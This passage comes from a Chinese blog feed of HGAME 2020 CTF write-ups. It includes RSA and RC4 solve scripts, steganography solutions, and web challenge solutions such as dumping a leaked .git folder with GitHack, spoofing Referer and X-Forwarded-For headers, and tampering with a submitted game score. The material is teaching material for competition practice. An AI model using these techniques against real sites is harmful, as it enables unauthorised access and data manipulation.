m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>

msg <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>

<span class="token keyword">print</span> msg 

<span class="token comment"># flag在msg里，其实肉眼就可得</span>
msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> line<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="notRC4"><a href="#notRC4" class="headerlink" title="notRC4"></a>notRC4</h3><p>RC4的最后状态的S盒已知，倒推每一步的状态，但是有个索引j（查查RC4的资料吧）不知道，想了一下午，最终学长给hint说可以枚举，呃，又是爆破。。。</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

box <span class="token operator">=</span>  <span class="token punctuation">[</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span>
enc_data <span class="token operator">=</span>  <span class="token string">b'\r#\x85\xad\xcbS\xfa\x94\x8b\x1a\xfa\xd8\xe2\xde3gU8\xda9\xd2\n7s\x0f\x13:"\x8b-\x01CzT\xb0b\x13\x03\xb9m\xe4\xe6\xb0\x87\xd8i\xbfO$\xab'</span>

<span class="token keyword">def</span> <span class="token function">get_lastj</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""爆破出最后一轮的索引j"""</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">^</span> enc_data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> j
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>

i <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span>
j <span class="token operator">=</span> get_lastj<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#print('(%s, %s)' % (i, j))</span>
    t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
    key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>
    box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token comment"># 换回来</span>
    j <span class="token operator">=</span> <span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">256</span><span class="token operator">-</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span> <span class="token comment"># 计算上一轮的j</span>
    i <span class="token operator">-=</span> <span class="token number">1</span> <span class="token comment"># 上一轮的i</span>

key <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 得到的密钥流是反转的，要反转回来</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span>enc_data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cosmos的午餐"><a href="#Cosmos的午餐" class="headerlink" title="Cosmos的午餐"></a>Cosmos的午餐</h3><p>wireshark分析，配置好TLS的密钥，参考一下<a href="https://blog.csdn.net/nimasike/article/details/80887436">https://blog.csdn.net/nimasike/article/details/80887436</a>，配置好ssl_log.log，即可解密TLS会话数据。</p>
<p>从一个包中找到上传文件的操作，并且找到上传后的路径</p>
<p><img src="/images/1966f4b8/misc-1-1.png" alt="1"></p>
<p>访问url，下载文件解压后，是图片一张，而且图片信息里有</p>
<p><img src="/images/1966f4b8/misc-1-3.png" alt="3"></p>
<p>想了半天，问出题人，让我看图片名字。然后百度知道这涉及到一个outguess隐写软件，ubuntu的apt有源，安装好后，用备注里的key解密出隐藏信息：</p>
<p><img src="/images/1966f4b8/misc-1-4.png" alt="4"></p>
<p>打开可下载一个压缩包，解压后是个二维码文件，扫码即可</p>
<hr>
<h3 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h3><p>压缩包是伪加密，解压后得到一张图片，查了好久查不出有隐写。几天后问了出题人，又是一次灵魂拷问：“压缩包注释你看了吗”，解压完后就把注意力放到图片上了，想不到压缩包还有猫腻。</p>
<p><img src="/images/1966f4b8/misc-2-1.png" alt="1"></p>
<p>那个F5之前查到过，是个隐写算法，那么这个图片应该是F5隐写的，而且后面有密码，用工具<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>可以解，解出来后是这样的：</p>
<p><img src="/images/1966f4b8/misc-2-2.png" alt="2">hex编码过，解码发现有rar压缩包的头，把解码后的数据写入文件，解开压缩包，有flag.txt，里面即flag</p>
<hr>
<h3 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h3><p>pdf里面有隐写的信息，搜索pdf隐写的资料，可查到一些工具，解密后得到</p>
<p><img src="/images/1966f4b8/misc-3-4.png" alt="4"></p>
<p>解压压缩包得到一个doc文档，修改后缀名为.zip，解压找到一个secret.xml里有flag</p>
<p><img src="/images/1966f4b8/misc-3-3.png" alt="3"></p>
<hr>
]]></content>
      <categories>
        <category>hgame-2020</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame-week1-writeup</title>
    <url>/20ebc87d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>hgame ctf比赛第一周的writeup</p>
<span id="more"></span>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><p>打开后是这个样子</p>
<p><img src="/images/20ebc87d/web-1-1.png" alt="1"></p>
<p>版本管理工具和GitHub都标记明显，想到应该是<code>.git</code>文件夹的泄露。但是直接访问<a href="http://cosmos.hgame.n3ko.co/.git/">http://cosmos.hgame.n3ko.co/.git/</a>是显示404，不管了，直接上工具<a href="https://github.com/BugScanTeam/GitHack.git">GitHack</a></p>
<p><strong>运行命令：</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GitHack.py  http://cosmos.hgame.n3ko.co/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后在这个工具所在位置下的目录<code>dist/cosmos.hgame.n3ko.co/.git/</code>下，发现<code>config</code>文件有问题（找了好久才发现）</p>
<p><img src="/images/20ebc87d/web-1-2.png" alt="2"></p>
<p>然后就去上图中的仓库<a href="https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc">https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc</a>找，发现其中一个commit有flag信息：</p>
<p><img src="/images/20ebc87d/web-1-3.png" alt=""></p>
<p>根据提示解码得到flag：<code>hgame&#123;g1t_le@k_1s_danger0us_!!!!&#125;</code></p>
<hr>
<h3 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h3><p>首先当然是打开链接啦</p>
<p><img src="/images/20ebc87d/web-2-1.png" alt=""></p>
<p>根据提示说要从<a href="https://vidar.club/">https://vidar.club/</a>过来这个页面，那就去google下http的头哪些可以表示从哪里跳转来的，发现一个<code>Referer</code>头，扔到burpsuite里试</p>
<p><img src="/images/20ebc87d/web-2-2.png" alt="2"></p>
<p>看来又要从本地访问，那肯定是伪造ip成<code>127.0.0.1</code>了，google发现<code>X-Forwarded-For</code>头可以伪造请求ip，再扔burpsuite里</p>
<p><img src="/images/20ebc87d/web-2-3.png" alt="3"></p>
<p>枯了，还要改浏览器标识，<code>User-Agent</code>头改成<code>Cosmos</code>即可</p>
<p><img src="/images/20ebc87d/web-2-4.png" alt="4"></p>
<p>。。。还要改一下请求方式</p>
<p><img src="/images/20ebc87d/web-2-5.png" alt="5"></p>
<p>最后这个，呃，要伪造发出请求时的时间成2077年之后，然后google了所有有关时间的http头，一个一个试（此处省略无数次失败），还问了下出题人，出题人的灵魂拷问</p>
<blockquote>
<p>“你都试过了吗？试了哪些？”</p>
</blockquote>
<p>突然发现我好像还没试完，想起之前忽略了的<code>If-Unmodified-Since</code>头，随后还真是！！！</p>
<p><img src="/images/20ebc87d/web-2-6.png" alt="6"></p>
<p>于是得到flag：<code>hgame&#123;W0w!Your_heads_@re_s0_many!&#125;</code></p>
<hr>
<h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p>开局就是一个403 Forbidden</p>
<p><img src="/images/20ebc87d/web-3-1.png" alt="1"></p>
<p>而且url本来是<a href="http://codeworld.hgame.day-day.work/">http://codeworld.hgame.day-day.work</a>，却变成<a href="http://codeworld.hgame.day-day.work/new.php">http://codeworld.hgame.day-day.work/new.php</a>，那应该是跳转了</p>
<p>好在我有burpsuite（多次打广告行为）</p>
<p><img src="/images/20ebc87d/web-3-2.png" alt="2"></p>
<p>图中的文字也印证了我的想法（cosmos被黑的好惨</p>
<p>那就直接访问链接<a href="http://codeworld.hgame.day-day.work/">http://codeworld.hgame.day-day.work</a>，看看跳转前都有什么</p>
<p><img src="/images/20ebc87d/web-3-3.png" alt="3"></p>
<p>看到这个Not Allowed我懵了好久，难道我错了？卡了半天就去做misc题了（而且还一题没做出来），一段时间后突然有想法，去搜了下405状态码是什么意思，发现</p>
<blockquote>
<h3 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h3><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p>
</blockquote>
<p>原来是请求的方法不对，虽然返回包中没有Allow头告诉我用什么方法请求，但最常用的除了GET就是POST了，那就改POST请求</p>
<p><img src="/images/20ebc87d/web-3-4.png" alt="4"></p>
<p>这里要提交url参数a，计算两个数相加结果为10，一个参数传两个值，一想就想到php的url传数组的方式</p>
<pre class="line-numbers language-none"><code class="language-none">?a[]&#x3D;1&amp;a[]&#x3D;9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现不对，url编码后再提交，发现还是不对，又卡住了。。。</p>
<p>最后，有个hint说a的参数的格式是<code>a=b+c</code>（此时已经有好多人解出来了），最后提交</p>
<pre class="line-numbers language-none"><code class="language-none">?a&#x3D;1%2b9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>（+号编码后为%2b）</p>
<p><img src="/images/20ebc87d/web-3-5.png" alt="5"></p>
<p>遂得flag：<code>hgame&#123;C0d3_1s_s0_S@_sO_C0ol!&#125;</code></p>
<hr>
<h3 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h3><p>这标题！这界面！</p>
<p><img src="/images/20ebc87d/web-4-1.png" alt="1"></p>
<p>律师函警告？！</p>
<p>咳咳！</p>
<p>最下面那行字说，只要分够，flag尽管拿，当然是开挂啦，开着burpsuite抓包，先玩一遍（玩着玩着忘了我在做ctf题）</p>
<p>发现有一个请求包发送了分数</p>
<p><img src="/images/20ebc87d/web-4-2.png" alt="2"></p>
<p>（不是我！别问了！我怎么可能只有500分！）</p>
<p>也不知道<code>|</code>后面那个是什么，先改了分数成999999</p>
<p><img src="/images/20ebc87d/web-4-3.png" alt="3"></p>
<p>嘻嘻，成了！flag：<code>hgame&#123;j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!&#125;</code></p>
<p>（做完后发现flag中有提示javascript的，看了下js文件，发现score参数字符<code>|</code>后面那个是时间戳的md5值，没什么影响）</p>
<hr>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>拖入ida，f5反汇编，简单处理一下后</p>
<p><img src="/images/20ebc87d/re-1-1.png" alt="1"></p>
<p>迷宫类题目，<code>wsad</code>为上下左右，图中的v5代表当前位置，水平方向移动4个字节，一行有64个字节</p>
<p><img src="/images/20ebc87d/re-1-2.png" alt="2"></p>
<p>可以直到<code>unk_602080</code>和<code>unk_60247C</code>是地图的边界了，且1为不可走，我的做法是把数据导（至于怎么导出查资料）出来，1用字符<code>#</code>打印，0用空格打印，画出地图来走迷宫，做是做出来了，有点麻烦，如下图</p>
<p><img src="/images/20ebc87d/re-1-3.png" alt="3"></p>
<p>其中的<code>x</code>是我标记的起点和终点。这样做很麻烦，我也不详细讲了，做完后学长提示，把4个字节看成一个单位会比较简单，呃，当我看到上上图中的<code>*(_DWORD *)v5 &amp; 1</code>的时候，我居然没发现这个问题？！</p>
<p>那么就按照4字节一个单位导出后，最低位为1的画成<code>#</code>，其余画成空格，地图如下：</p>
<p><img src="/images/20ebc87d/re-1-4.png" alt="4"></p>
<p>这样简单多了，flag：<code>hgame&#123;ssssddddddsssssddwwdddssssdssdd&#125;</code></p>
<hr>
<h3 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h3><p>首先，拖入ida，找到main函数反汇编</p>
<p><img src="/images/20ebc87d/re-2-1.png" alt="1"></p>
<p>红框可以看到，再加上后面有个异或操作，而且这样的访问方式揭示了是v6,v7,…,v13是个数组，可以修改一下变量的定义：</p>
<p><img src="/images/20ebc87d/re-2-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-2-3.png" alt="3"></p>
<p>类似的操作（其余修改变量函数名，修改类型什么的可以自己查资料学习下），分析完后如下：</p>
<p><img src="/images/20ebc87d/re-2-4.png" alt="4"></p>
<p><img src="/images/20ebc87d/re-2-5.png" alt="5"></p>
